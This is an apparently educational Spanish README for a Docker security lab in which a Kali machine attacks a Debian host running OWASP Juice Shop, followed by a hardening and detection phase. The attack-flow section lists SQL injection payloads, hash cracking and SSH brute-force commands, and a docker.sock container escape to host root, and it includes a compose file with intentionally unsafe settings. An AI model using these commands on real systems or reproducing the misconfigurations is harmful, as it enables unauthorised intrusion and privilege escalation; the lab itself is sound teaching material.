# Seguridad En Docker

> Laboratorio práctico de seguridad de contenedores Docker: explotación de
> misconfiguraciones, container escape y hardening defensivo en un entorno
> Kali Linux vs Debian 12.

![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)
![Debian](https://img.shields.io/badge/Debian-D70A53?style=for-the-badge&logo=debian&logoColor=white)
![OWASP](https://img.shields.io/badge/OWASP-000000?style=for-the-badge&logo=owasp&logoColor=white)
![Status](https://img.shields.io/badge/status-Completado-green?style=for-the-badge)

---

## Objetivo

Este laboratorio demuestra, de forma controlada y reproducible, cómo una
mala configuración de Docker puede comprometer no solo un contenedor, sino
también el sistema anfitrión completo.

Partiendo únicamente de una dirección IP, se recorre el ciclo completo de
un ataque real. Tras la fase ofensiva, se aplican técnicas de **hardening**
y monitorización, demostrando que el mismo ataque deja de ser viable.

---

## Aclaraciones importantes

### El laboratorio es un entorno controlado

Este laboratorio no es un ataque 100% real. Hay cosas que damos por hechas
que en un ataque real serían más difíciles de conseguir. Lo hacemos así por
dos razones:

- Es un laboratorio **académico**: el objetivo es demostrar que entendemos
  las técnicas y conceptos detrás de cada ataque, no comprometer sistemas reales.
- Tiene que ser **reproducible**: cualquier persona que lea el repositorio
  debe poder ejecutar exactamente los mismos pasos en su propio entorno.

### Escenario simulado

El laboratorio se basa en un escenario realista muy común en el mundo real:

> **Morty** es un trabajador del departamento de IT de la empresa. Como
> empleado, tiene cuenta en la aplicación web interna (Juice Shop). Como
> trabajador de IT, tiene acceso SSH al servidor para tareas de
> administración. Morty reutiliza su contraseña de la aplicación web en
> el servidor SSH.

Según el informe **Verizon DBIR**, el 80% de las brechas de seguridad
involucran credenciales comprometidas o reutilizadas. Este es exactamente
el vector que demostramos.

---

## Arquitectura del laboratorio

| Componente | Tecnología | IP / Puerto |
|---|---|---|
| VM atacante | Kali Linux (QEMU/KVM) | 192.168.122.xxx |
| VM víctima | Debian 12 (bookworm) | 192.168.122.95 |
| Servicio SSH | OpenSSH 9.2p1 | Puerto 22 |
| Servicio web | Apache 2.4.67 | Puerto 80 |
| App vulnerable | OWASP Juice Shop | Puerto 3000 |
| Contenedor web | juiceshop (172.18.0.2) | Red lab-net |
| Contenedor vuln. | vuln-container (172.18.0.3) | Red lab-net |

Desde Kali solo son accesibles los puertos del HOST (22, 80, 3000).
Los contenedores son internos y solo se alcanzan desde dentro del
servidor o a través de los puertos mapeados.

---

## Stack tecnológico

| Componente | Tecnología | Versión |
|---|---|---|
| Hipervisor | QEMU/KVM (libvirt) | — |
| VM atacante | Kali Linux | Rolling |
| VM víctima | Debian GNU/Linux | 12 (bookworm) |
| Kernel víctima | Linux | 6.1.0-48-amd64 |
| Contenedor app vulnerable | OWASP Juice Shop | latest |
| Contenedor mal configurado | Ubuntu | 22.04 |
| Orquestación | Docker Compose | v2 |
| Detección (fase defensiva) | Falco + Trivy | latest |

---

## Fases del laboratorio

| # | Fase | Descripción | Documentación |
|---|---|---|---|
| 0 | Setup | Instalación de Docker y configuración del entorno | [01-setup.md](docs/01-setup.md) |
| 1 | Despliegue | Stack vulnerable con Docker Compose | [02-deployment.md](docs/02-deployment.md) |
| 2 | Reconocimiento | nmap, headers HTTP, fingerprinting de servicios | [03-recon.md](docs/03-recon.md) |
| 3 | Explotación | SQLi, volcado de BD, crackeo de hashes, hydra, SSH | [04-exploitation.md](docs/04-exploitation.md) |
| 4 | Container Escape | docker.sock, privileged, capabilities excesivas | [05-container-escape.md](docs/05-container-escape.md) |
| 5 | Hardening | Stack seguro, mínimo privilegio, segmentación de red | [06-hardening.md](docs/06-hardening.md) |
| 6 | Detección | Falco, Trivy, monitorización en tiempo real | [07-detection.md](docs/07-detection.md) |

---

## Scripts desarrollados

Scripts bash propios desarrollados para automatizar cada fase del laboratorio:

| Script | Descripción | Uso |
|---|---|---|
| `recon.sh` | Reconocimiento automatizado (ping, nmap, curl, whatweb, gobuster) | `./scripts/recon.sh <IP>` |
| `exploit.sh` | Encadena SQLi, volcado de BD, john the ripper y hydra | `./scripts/exploit.sh <IP>` |
| `escape.sh` | Demostración automatizada del container escape | `./scripts/escape.sh` |
| `hardening.sh` | Aplica todas las mitigaciones defensivas | `./scripts/hardening.sh` |
| `detection.sh` | Instala Trivy y Falco y ejecuta escaneos | `./scripts/detection.sh` |

---

## Vulnerabilidades demostradas

| CWE | Vulnerabilidad | Vector | Impacto |
|---|---|---|---|
| CWE-89 | SQL Injection | Formulario de login (Juice Shop) | Acceso como admin, volcado completo de la BD |
| CWE-916 | Hashes MD5 sin sal | Base de datos interna de Juice Shop | Crackeo trivial con john the ripper |
| CWE-307 | Sin protección ante fuerza bruta | SSH (puerto 22) | Acceso al servidor con hydra |
| CWE-269 | docker.sock expuesto en contenedor | vuln-container | Container escape -> root en el host |
| CWE-250 | privileged: true | vuln-container | Acceso completo al kernel y dispositivos del host |
| CWE-732 | cap_add: ALL | vuln-container | Todas las capabilities de Linux habilitadas |
| CWE-284 | IDOR (Insecure Direct Object Reference) | API de Juice Shop | Acceso a datos de otros usuarios |
| CWE-79 | Cross-Site Scripting (XSS) | Buscador de Juice Shop | Inyección de código JavaScript arbitrario |

---

## Flujo completo del ataque

```
[Kali]
  |
  +-- 01 · nmap -sV -> descubrir puertos 22, 80, 3000
  |
  +-- 02 · curl -I -> análisis de headers HTTP (information disclosure)
  |
  +-- 03 · SQLi en /login -> acceso como admin@juice-sh.op
  |         payload: ' OR 1=1 --
  |
  +-- 04 · UNION SQLi -> volcar tabla Users (emails + hashes MD5)
  |         payload: ')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
  |
  +-- 05 · john the ripper -> crackear hashes MD5
  |         john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  |
  +-- 06 · hydra -> fuerza bruta SSH con credenciales obtenidas
  |         hydra -l morty -P passwords.txt ssh://192.168.122.95
  |
  +-- 07 · Acceso SSH al servidor víctima como morty
  |
  +-- 08 · docker exec -> shell en vuln-container
  |
  +-- 09 · Detección de docker.sock montado dentro del contenedor
  |         ls -la /var/run/docker.sock
  |
  +-- 10 · Container escape via docker.sock
  |         docker run -it --rm -v /:/host alpine chroot /host bash
  |
  +-- 11 · ROOT en el host
            id -> uid=0(root) gid=0(root)
```

---

## Misconfiguraciones del contenedor vulnerable

El contenedor `vuln-container` incluye **tres misconfiguraciones críticas**
introducidas a propósito para demostrar los vectores de container escape:

```yaml
vuln-container:
  image: ubuntu:22.04
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock   # [MAL] Control total del daemon Docker
  privileged: true                                 # [MAL] Sin aislamiento del kernel
  cap_add:
    - ALL                                          # [MAL] Todas las capabilities de Linux
```

| Misconfiguración | Riesgo | Técnica de explotación |
|---|---|---|
| `docker.sock` montado | Crítico | Lanzar contenedor con `/` del host montado -> chroot -> root |
| `privileged: true` | Crítico | Acceso a `/dev`, montar sistemas de archivos del host |
| `cap_add: ALL` | Crítico | Abuso de cgroups, ptrace, módulos del kernel |

---

## Hardening aplicado (fase defensiva)

Tras la fase ofensiva, se aplican las siguientes mitigaciones:

```yaml
vuln-container-hardened:
  image: ubuntu:22.04
  user: "1000:1000"              # [BIEN] Usuario no root
  read_only: true                # [BIEN] Sistema de archivos solo lectura
  cap_drop:
    - ALL                        # [BIEN] Sin capabilities
  cap_add:
    - NET_BIND_SERVICE           # [BIEN] Solo las estrictamente necesarias
  security_opt:
    - no-new-privileges          # [BIEN] Sin escalada de privilegios
  # Sin docker.sock              # [BIEN] Socket no montado
  # Sin privileged               # [BIEN] Sin modo privilegiado
```

---

## Reproducir el laboratorio

### Requisitos previos

- QEMU/KVM, VirtualBox o VMware
- VM con Kali Linux (atacante)
- VM con Debian 12 y Docker instalado (víctima)
- Ambas VMs en la misma red (NAT Network, red interna o host-only)

### Despliegue del stack vulnerable

```bash
# Clonar el repositorio en el servidor víctima
git clone https://github.com/LeanMaster777/docker-security-lab
cd docker-security-lab

# Levantar el stack vulnerable
docker compose -f compose/vulnerable.yml up -d

# Verificar que ambos contenedores están corriendo
docker ps
```

### Verificación

```bash
# Juice Shop accesible
curl -I http://localhost:3000
# Esperado: HTTP/1.1 200 OK

# Desde Kali
nmap -sV -p 22,80,3000 <IP_SERVIDOR>
```

---

## Estructura del repositorio

| Archivo | Descripción |
|---|---|
| `README.md` | Portada del proyecto |
| `docs/01-setup.md` | Instalación de Docker |
| `docs/02-deployment.md` | Despliegue del stack |
| `docs/03-recon.md` | Reconocimiento desde Kali |
| `docs/04-exploitation.md` | SQLi, john, hydra, SSH |
| `docs/05-container-escape.md` | Container escape al host |
| `docs/06-hardening.md` | Fase defensiva |
| `docs/07-detection.md` | Falco + Trivy |
| `compose/vulnerable.yml` | Stack vulnerable |
| `compose/hardened.yml` | Stack hardenizado |
| `scripts/recon.sh` | Reconocimiento automatizado |
| `scripts/exploit.sh` | SQLi, john y hydra encadenados |
| `scripts/escape.sh` | Demostración del container escape |
| `scripts/hardening.sh` | Aplicar hardening automáticamente |
| `scripts/detection.sh` | Instalación y demo de Falco y Trivy |
| `screenshots/` | Capturas de pantalla del lab |

---

## Aviso legal

> Este laboratorio está diseñado **exclusivamente con fines educativos** en
> un entorno aislado y controlado. Todas las pruebas se realizan sobre
> máquinas virtuales propias dentro de una red privada sin conexión al
> exterior. Las técnicas, herramientas y procedimientos descritos **no deben
> aplicarse jamás** sobre sistemas, redes o infraestructuras de terceros sin
> autorización expresa y por escrito. Su uso indebido puede constituir un
> delito tipificado en la legislación vigente sobre acceso ilícito a sistemas
> informáticos.

---

## Autor

Proyecto desarrollado como laboratorio práctico por Adrià Puga
